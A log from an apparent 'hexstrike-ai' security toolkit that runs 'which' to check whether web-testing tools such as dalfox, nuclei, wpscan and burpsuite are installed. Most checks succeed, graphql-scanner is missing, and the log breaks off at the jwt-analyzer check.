2025-10-24 01:26:45,060 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,061 - __main__ - INFO - 🆔 PROCESS: PID 43072 started
2025-10-24 01:26:45,061 - __main__ - INFO - 🆔 REGISTERED: Process 43072 - which arjun...
2025-10-24 01:26:45,062 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43072
2025-10-24 01:26:45,065 - __main__ - INFO - 📤 STDOUT: /usr/bin/arjun
2025-10-24 01:26:45,065 - __main__ - INFO - 🧹 CLEANUP: Process 43072 removed from registry
2025-10-24 01:26:45,069 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,069 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,069 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,069 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,069 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which arjun
2025-10-24 01:26:45,069 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,069 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 15 bytes
2025-10-24 01:26:45,069 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,069 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,069 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,069 - __main__ - INFO - 💾 Cached result for command: which arjun
2025-10-24 01:26:45,069 - __main__ - INFO - 🔍 Cache MISS for command: which paramspider
2025-10-24 01:26:45,069 - __main__ - INFO - 🚀 EXECUTING: which paramspider
2025-10-24 01:26:45,069 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,072 - __main__ - INFO - 🆔 PROCESS: PID 43077 started
2025-10-24 01:26:45,073 - __main__ - INFO - 🆔 REGISTERED: Process 43077 - which paramspider...
2025-10-24 01:26:45,073 - __main__ - INFO - 📤 STDOUT: /usr/bin/paramspider
2025-10-24 01:26:45,074 - __main__ - INFO - 🧹 CLEANUP: Process 43077 removed from registry
2025-10-24 01:26:45,074 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,074 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,074 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,074 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,074 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which paramspider
2025-10-24 01:26:45,074 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,074 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 21 bytes
2025-10-24 01:26:45,074 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,074 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,074 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,074 - __main__ - INFO - 💾 Cached result for command: which paramspider
2025-10-24 01:26:45,074 - __main__ - INFO - 🔍 Cache MISS for command: which x8
2025-10-24 01:26:45,074 - __main__ - INFO - 🚀 EXECUTING: which x8
2025-10-24 01:26:45,074 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,074 - __main__ - INFO - 🆔 PROCESS: PID 43082 started
2025-10-24 01:26:45,074 - __main__ - INFO - 🆔 REGISTERED: Process 43082 - which x8...
2025-10-24 01:26:45,075 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43082
2025-10-24 01:26:45,083 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/x8
2025-10-24 01:26:45,092 - __main__ - INFO - 🧹 CLEANUP: Process 43082 removed from registry
2025-10-24 01:26:45,092 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.02s
2025-10-24 01:26:45,092 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,092 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,092 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,092 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which x8
2025-10-24 01:26:45,092 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.02s
2025-10-24 01:26:45,092 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 01:26:45,092 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,092 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,092 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,092 - __main__ - INFO - 💾 Cached result for command: which x8
2025-10-24 01:26:45,093 - __main__ - INFO - 🔍 Cache MISS for command: which jaeles
2025-10-24 01:26:45,093 - __main__ - INFO - 🚀 EXECUTING: which jaeles
2025-10-24 01:26:45,093 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,093 - __main__ - INFO - 🆔 PROCESS: PID 43087 started
2025-10-24 01:26:45,093 - __main__ - INFO - 🆔 REGISTERED: Process 43087 - which jaeles...
2025-10-24 01:26:45,094 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43087
2025-10-24 01:26:45,095 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/jaeles
2025-10-24 01:26:45,108 - __main__ - INFO - 🧹 CLEANUP: Process 43087 removed from registry
2025-10-24 01:26:45,108 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.02s
2025-10-24 01:26:45,108 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,108 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,108 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,108 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which jaeles
2025-10-24 01:26:45,108 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.02s
2025-10-24 01:26:45,108 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 22 bytes
2025-10-24 01:26:45,109 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,109 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,109 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,109 - __main__ - INFO - 💾 Cached result for command: which jaeles
2025-10-24 01:26:45,109 - __main__ - INFO - 🔍 Cache MISS for command: which dalfox
2025-10-24 01:26:45,109 - __main__ - INFO - 🚀 EXECUTING: which dalfox
2025-10-24 01:26:45,109 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,110 - __main__ - INFO - 🆔 PROCESS: PID 43092 started
2025-10-24 01:26:45,110 - __main__ - INFO - 🆔 REGISTERED: Process 43092 - which dalfox...
2025-10-24 01:26:45,111 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43092
2025-10-24 01:26:45,112 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/dalfox
2025-10-24 01:26:45,116 - __main__ - INFO - 🧹 CLEANUP: Process 43092 removed from registry
2025-10-24 01:26:45,116 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,116 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,116 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,116 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,116 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which dalfox
2025-10-24 01:26:45,116 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,116 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 22 bytes
2025-10-24 01:26:45,116 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,116 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,116 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,116 - __main__ - INFO - 💾 Cached result for command: which dalfox
2025-10-24 01:26:45,116 - __main__ - INFO - 🔍 Cache MISS for command: which httpx
2025-10-24 01:26:45,116 - __main__ - INFO - 🚀 EXECUTING: which httpx
2025-10-24 01:26:45,116 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,125 - __main__ - INFO - 🆔 PROCESS: PID 43097 started
2025-10-24 01:26:45,125 - __main__ - INFO - 🆔 REGISTERED: Process 43097 - which httpx...
2025-10-24 01:26:45,125 - __main__ - INFO - 📤 STDOUT: /opt/hexstrike-ai/hexstrike-env/bin/httpx
2025-10-24 01:26:45,126 - __main__ - INFO - 🧹 CLEANUP: Process 43097 removed from registry
2025-10-24 01:26:45,126 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,126 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,126 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,126 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,126 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which httpx
2025-10-24 01:26:45,126 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,126 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 42 bytes
2025-10-24 01:26:45,126 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,126 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,126 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,126 - __main__ - INFO - 💾 Cached result for command: which httpx
2025-10-24 01:26:45,126 - __main__ - INFO - 🔍 Cache MISS for command: which wafw00f
2025-10-24 01:26:45,126 - __main__ - INFO - 🚀 EXECUTING: which wafw00f
2025-10-24 01:26:45,126 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,127 - __main__ - INFO - 🆔 PROCESS: PID 43102 started
2025-10-24 01:26:45,127 - __main__ - INFO - 🆔 REGISTERED: Process 43102 - which wafw00f...
2025-10-24 01:26:45,127 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43102
2025-10-24 01:26:45,129 - __main__ - INFO - 📤 STDOUT: /usr/bin/wafw00f
2025-10-24 01:26:45,162 - __main__ - INFO - 🧹 CLEANUP: Process 43102 removed from registry
2025-10-24 01:26:45,162 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.04s
2025-10-24 01:26:45,162 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,163 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,163 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,163 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which wafw00f
2025-10-24 01:26:45,163 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.04s
2025-10-24 01:26:45,163 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 01:26:45,163 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,163 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,163 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,163 - __main__ - INFO - 💾 Cached result for command: which wafw00f
2025-10-24 01:26:45,163 - __main__ - INFO - 🔍 Cache MISS for command: which burpsuite
2025-10-24 01:26:45,163 - __main__ - INFO - 🚀 EXECUTING: which burpsuite
2025-10-24 01:26:45,163 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,163 - __main__ - INFO - 🆔 PROCESS: PID 43107 started
2025-10-24 01:26:45,164 - __main__ - INFO - 🆔 REGISTERED: Process 43107 - which burpsuite...
2025-10-24 01:26:45,165 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43107
2025-10-24 01:26:45,166 - __main__ - INFO - 📤 STDOUT: /usr/bin/burpsuite
2025-10-24 01:26:45,169 - __main__ - INFO - 🧹 CLEANUP: Process 43107 removed from registry
2025-10-24 01:26:45,169 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,169 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,169 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,169 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,169 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which burpsuite
2025-10-24 01:26:45,169 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,169 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 19 bytes
2025-10-24 01:26:45,169 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,169 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,169 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,169 - __main__ - INFO - 💾 Cached result for command: which burpsuite
2025-10-24 01:26:45,169 - __main__ - INFO - 🔍 Cache MISS for command: which zaproxy
2025-10-24 01:26:45,169 - __main__ - INFO - 🚀 EXECUTING: which zaproxy
2025-10-24 01:26:45,169 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,169 - __main__ - INFO - 🆔 PROCESS: PID 43112 started
2025-10-24 01:26:45,169 - __main__ - INFO - 🆔 REGISTERED: Process 43112 - which zaproxy...
2025-10-24 01:26:45,170 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43112
2025-10-24 01:26:45,172 - __main__ - INFO - 📤 STDOUT: /usr/bin/zaproxy
2025-10-24 01:26:45,174 - __main__ - INFO - 🧹 CLEANUP: Process 43112 removed from registry
2025-10-24 01:26:45,175 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,175 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,175 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,175 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,175 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which zaproxy
2025-10-24 01:26:45,175 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,175 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 01:26:45,175 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,175 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,175 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,175 - __main__ - INFO - 💾 Cached result for command: which zaproxy
2025-10-24 01:26:45,175 - __main__ - INFO - 🔍 Cache MISS for command: which katana
2025-10-24 01:26:45,175 - __main__ - INFO - 🚀 EXECUTING: which katana
2025-10-24 01:26:45,175 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,176 - __main__ - INFO - 🆔 PROCESS: PID 43117 started
2025-10-24 01:26:45,176 - __main__ - INFO - 🆔 REGISTERED: Process 43117 - which katana...
2025-10-24 01:26:45,178 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/katana
2025-10-24 01:26:45,178 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 6591049 B/s | 0.0s | PID: 43117
2025-10-24 01:26:45,181 - __main__ - INFO - 🧹 CLEANUP: Process 43117 removed from registry
2025-10-24 01:26:45,181 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,181 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,181 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,181 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,181 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which katana
2025-10-24 01:26:45,181 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,181 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 22 bytes
2025-10-24 01:26:45,181 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,181 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,181 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,181 - __main__ - INFO - 💾 Cached result for command: which katana
2025-10-24 01:26:45,181 - __main__ - INFO - 🔍 Cache MISS for command: which hakrawler
2025-10-24 01:26:45,181 - __main__ - INFO - 🚀 EXECUTING: which hakrawler
2025-10-24 01:26:45,181 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,182 - __main__ - INFO - 🆔 PROCESS: PID 43123 started
2025-10-24 01:26:45,182 - __main__ - INFO - 🆔 REGISTERED: Process 43123 - which hakrawler...
2025-10-24 01:26:45,182 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43123
2025-10-24 01:26:45,186 - __main__ - INFO - 📤 STDOUT: /usr/bin/hakrawler
2025-10-24 01:26:45,189 - __main__ - INFO - 🧹 CLEANUP: Process 43123 removed from registry
2025-10-24 01:26:45,189 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,189 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,189 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,189 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,189 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which hakrawler
2025-10-24 01:26:45,189 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,189 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 19 bytes
2025-10-24 01:26:45,189 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,189 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,189 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,189 - __main__ - INFO - 💾 Cached result for command: which hakrawler
2025-10-24 01:26:45,189 - __main__ - INFO - 🔍 Cache MISS for command: which nuclei
2025-10-24 01:26:45,189 - __main__ - INFO - 🚀 EXECUTING: which nuclei
2025-10-24 01:26:45,189 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,189 - __main__ - INFO - 🆔 PROCESS: PID 43128 started
2025-10-24 01:26:45,189 - __main__ - INFO - 🆔 REGISTERED: Process 43128 - which nuclei...
2025-10-24 01:26:45,190 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43128
2025-10-24 01:26:45,192 - __main__ - INFO - 📤 STDOUT: /usr/bin/nuclei
2025-10-24 01:26:45,195 - __main__ - INFO - 🧹 CLEANUP: Process 43128 removed from registry
2025-10-24 01:26:45,195 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,195 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,195 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,195 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,195 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which nuclei
2025-10-24 01:26:45,195 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,195 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 16 bytes
2025-10-24 01:26:45,195 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,195 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,195 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,195 - __main__ - INFO - 💾 Cached result for command: which nuclei
2025-10-24 01:26:45,195 - __main__ - INFO - 🔍 Cache MISS for command: which wpscan
2025-10-24 01:26:45,195 - __main__ - INFO - 🚀 EXECUTING: which wpscan
2025-10-24 01:26:45,195 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,196 - __main__ - INFO - 🆔 PROCESS: PID 43133 started
2025-10-24 01:26:45,196 - __main__ - INFO - 🆔 REGISTERED: Process 43133 - which wpscan...
2025-10-24 01:26:45,197 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43133
2025-10-24 01:26:45,198 - __main__ - INFO - 📤 STDOUT: /usr/bin/wpscan
2025-10-24 01:26:45,201 - __main__ - INFO - 🧹 CLEANUP: Process 43133 removed from registry
2025-10-24 01:26:45,201 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,201 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,201 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,201 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,201 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which wpscan
2025-10-24 01:26:45,201 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,201 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 16 bytes
2025-10-24 01:26:45,201 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,201 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,201 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,201 - __main__ - INFO - 💾 Cached result for command: which wpscan
2025-10-24 01:26:45,201 - __main__ - INFO - 🔍 Cache MISS for command: which graphql-scanner
2025-10-24 01:26:45,201 - __main__ - INFO - 🚀 EXECUTING: which graphql-scanner
2025-10-24 01:26:45,201 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,202 - __main__ - INFO - 🆔 PROCESS: PID 43138 started
2025-10-24 01:26:45,202 - __main__ - INFO - 🆔 REGISTERED: Process 43138 - which graphql-scanner...
2025-10-24 01:26:45,203 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43138
2025-10-24 01:26:45,207 - __main__ - INFO - 🧹 CLEANUP: Process 43138 removed from registry
2025-10-24 01:26:45,207 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 01:26:45,207 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,207 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:45,207 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,207 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which graphql-scanner
2025-10-24 01:26:45,207 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,207 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:45,207 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:45,207 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:45,207 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,207 - __main__ - INFO - 🔍 Cache MISS for command: which jwt-analyzer
2025-10-24 01:26:45,208 - __main__ - INFO - 🚀 EXECUTING: which jwt-analyzer
2025-10-24 01:26:45,208 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
